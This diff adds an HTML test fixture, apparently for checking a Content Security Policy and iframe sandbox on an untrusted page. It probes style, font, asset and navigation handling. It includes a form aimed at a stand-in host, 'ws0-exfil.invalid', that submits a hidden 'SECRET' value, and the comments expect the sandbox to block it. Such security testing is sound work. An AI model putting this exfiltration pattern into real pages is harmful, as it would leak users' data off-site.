@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>WS0 untrusted page</title>
+
+<!-- FIRST: violations from <link>/<style> below fire during parse, so the
+     listener has to exist before them or they are silently missed. -->
+<script src="csp-probe.js"></script>
+
+<!-- external stylesheet: exercises style-src 'self', CSS url(), and font-src -->
+<link rel="stylesheet" href="styles.css">
+
+<!-- inline <style>: expected to be BLOCKED by style-src 'self' (no unsafe-inline).
+     Measured, not assumed — the inline-style decision is still open. -->
+<style>#inlineStyleProbe { color: rgb(1, 2, 3); }</style>
+</head>
+<body>
+  <h1>WS0 untrusted page</h1>
+
+  <div id="externalStyleProbe">external stylesheet probe</div>
+  <div id="inlineStyleProbe">inline style element probe</div>
+  <div id="styleAttrProbe" style="color: rgb(4, 5, 6);">style attribute probe</div>
+  <div id="cssomProbe">cssom probe</div>
+  <div id="setAttrProbe">setAttribute style probe</div>
+  <div id="fontProbe">font probe</div>
+  <div id="bgProbe">css url() probe</div>
+
+  <!-- relative asset: must resolve even though the document origin is opaque -->
+  <img id="relImg" src="assets/dot.png" alt="">
+
+  <!-- relative link: multi-page navigation target -->
+  <a id="relLink" href="page2.html">page 2</a>
+
+  <!-- form pointed off-origin: expected blocked by sandbox (no allow-forms)
+       AND by form-action 'none' -->
+  <form id="exfilForm" action="https://ws0-exfil.invalid/collect" method="GET">
+    <input type="hidden" name="d" value="SECRET">
+    <button type="submit">submit</button>
+  </form>
+
+  <pre id="out">running…</pre>
+
+  <!-- Scripts must be external: script-src 'self' blocks inline scripts.
+       That constraint is itself part of what this page verifies. -->
+  <script src="app-data.js"></script>
+  <script src="app.js"></script>
+  <script type="module" src="app.module.js"></script>
+</body>
+</html>
